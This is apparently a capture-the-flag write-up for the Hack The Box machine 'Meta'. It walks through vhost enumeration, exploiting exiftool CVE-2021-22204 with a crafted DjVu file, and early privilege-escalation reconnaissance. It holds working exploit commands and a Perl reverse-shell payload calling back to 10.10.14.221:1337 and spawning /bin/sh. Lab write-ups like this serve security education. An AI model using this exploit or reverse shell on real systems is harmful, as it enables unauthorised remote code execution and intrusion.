# Meta

## Acessing meta.htb

````http
HTTP/1.1 301 Moved Permanently
Date: Wed, 26 Jan 2022 23:43:08 GMT
Server: Apache
Location: http://artcorp.htb
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
````

## Accessing artcorp.htb

````html
<div class="col-lg-6 my-auto showcase-text">
<h2>Development in progress</h2>
<p class="lead mb-0">We are almost ready to launch our new product <b>"MetaView"</b>.<br/><br/>The product is already in testing phase.<br/> Stay tuned!</p>
</div>
````

## Enumeration

````
$ gobuster vhost -u http://artcorp.htb -w /root/Downloads/subdomains-top1million-110000.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://artcorp.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /root/Downloads/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/01/29 08:48:14 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev01.artcorp.htb (Status: 200) [Size: 247]
````


* Acessing http://dev01.artcorp.htb/metaview give us a tool to analyze images, it looks like an exiftool output

````
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 521
Image Height                    : 520
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Pixels Per Unit X               : 11811
Pixels Per Unit Y               : 11811
Pixel Units                     : meters
Profile Name                    : Photoshop ICC profile
Profile CMM Type                : Linotronic
Profile Version                 : 2.1.0
Profile Class                   : Display Device Profile
Color Space Data                : RGB
Profile Connection Space        : XYZ
Profile Date Time               : 1998:02:09 06:49:00
Profile File Signature          : acsp
Primary Platform                : Microsoft Corporation
CMM Flags                       : Not Embedded, Independent
Device Manufacturer             : Hewlett-Packard
Device Model                    : sRGB
Device Attributes               : Reflective, Glossy, Positive, Color
Rendering Intent                : Media-Relative Colorimetric
Connection Space Illuminant     : 0.9642 1 0.82491
Profile Creator                 : Hewlett-Packard
Profile ID                      : 0
Profile Copyright               : Copyright (c) 1998 Hewlett-Packard Company
Profile Description             : sRGB IEC61966-2.1
Media White Point               : 0.95045 1 1.08905
Media Black Point               : 0 0 0
Red Matrix Column               : 0.43607 0.22249 0.01392
Green Matrix Column             : 0.38515 0.71687 0.09708
Blue Matrix Column              : 0.14307 0.06061 0.7141
Device Mfg Desc                 : IEC http://www.iec.ch
Device Model Desc               : IEC 61966-2.1 Default RGB colour space - sRGB
Viewing Cond Desc               : Reference Viewing Condition in IEC61966-2.1
Viewing Cond Illuminant         : 19.6445 20.3718 16.8089
Viewing Cond Surround           : 3.92889 4.07439 3.36179
Viewing Cond Illuminant Type    : D50
Luminance                       : 76.03647 80 87.12462
Measurement Observer            : CIE 1931
Measurement Backing             : 0 0 0
Measurement Geometry            : Unknown
Measurement Flare               : 0.999%
Measurement Illuminant          : D65
Technology                      : Cathode Ray Tube Display
Red Tone Reproduction Curve     : (Binary data 2060 bytes, use -b option to extract)
Green Tone Reproduction Curve   : (Binary data 2060 bytes, use -b option to extract)
Blue Tone Reproduction Curve    : (Binary data 2060 bytes, use -b option to extract)
White Point X                   : 0.31269
White Point Y                   : 0.32899
Red X                           : 0.63999
Red Y                           : 0.33001
Green X                         : 0.3
Green Y                         : 0.6
Blue X                          : 0.15
Blue Y                          : 0.05999
````

* There is a know vulnerability for exiftool in DjVu ParseAnt function [CVE-2021-22204](https://nvd.nist.gov/vuln/detail/CVE-2021-22204) which leads to arbitrary code execution.

* Conviso have written about this vulnerability https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/

## Exploit
1. Create valid DjVu exploit file

payload file
````
(metadata "\c${system('id')};")
````

````
# Installs the required tools
$ sudo apt install djvulibre-bin


# Compress our payload file with to make it non human-readable
$ bzz payload payload.bzz

# INFO = Anything in the format 'N,N' where N is a number
# BGjp = Expects a JPEG image, but we can use /dev/null to use nothing as background image
# ANTz = Will write the compressed annotation chunk with the input file
$ djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz
````

configfile
````
%Image::ExifTool::UserDefined = (
    # All EXIF tags are added to the Main table, and WriteGroup is used to
    # specify where the tag is written (default is ExifIFD if not specified):
    'Image::ExifTool::Exif::Main' => {
        # Example 1.  EXIF:NewEXIFTag
        0xc51b => {
            Name => 'HasselbladExif',
            Writable => 'string',
            WriteGroup => 'IFD0',
        },
        # add more user-defined EXIF tags here...
    },
);
1; #end%
````

````
# configfile = The name of our eval.config configuration file;
# -HasselbladExif = Tag name that are specified in the config file;
# exploit.djvu = Our exploit, previously made with djvumake;
# hacker.jpg = A valid JPEG file;
$ exiftool -config configfile '-HasselbladExif<=exploit.djvu' hacker.jpg

````

* Make the request and you gonna see the result
````
uid=33(www-data) gid=33(www-data) groups=33(www-data)
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Exif Byte Order                 : Big-endian (Motorola, MM)
X Resolution                    : 1
Y Resolution                    : 1
Resolution Unit                 : None
Y Cb Cr Positioning             : Centered
DjVu Version                    : 0.24
Spatial Resolution              : 300
Gamma                           : 2.2
Orientation                     : Horizontal (normal)
Image Width                     : 225
Image Height                    : 225
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
````

* I've tried many reverse shell options w/out success, searching I found this one (https://github.com/AssassinUKG/CVE-2021-22204)

````
(metadata "\c${use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(1337,inet_aton('10.10.14.221')))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};};#")
````

````
root@kali:~# nc -nlvp 1337
listening on [any] 1337 ...
connect to [10.10.14.221] from (UNKNOWN) [10.10.11.140] 54394
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ pwd   
/var/www/dev01.artcorp.htb/metaview
$ 
````

## Enumeration

2. Executes [pspy](https://github.com/DominicBreuker/pspy/releases) 

````
2022/01/29 14:01:01 CMD: UID=1000 PID=4021   | /bin/bash /usr/local/bin/convert_images.sh 
2022/01/29 14:01:01 CMD: UID=1000 PID=4020   | /bin/sh -c /usr/local/bin/convert_images.sh 
2022/01/29 14:01:01 CMD: UID=1000 PID=4022   | /usr/local/bin/mogrify -format png *.* 
````

````
$ cat  /usr/local/bin/convert_images.sh
#!/bin/bash
cd /var/www/dev01.artcorp.htb/convert_images/ && /usr/local/bin/mogrify -format png *.* 2>/dev/null
pkill mogrify
````

https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html

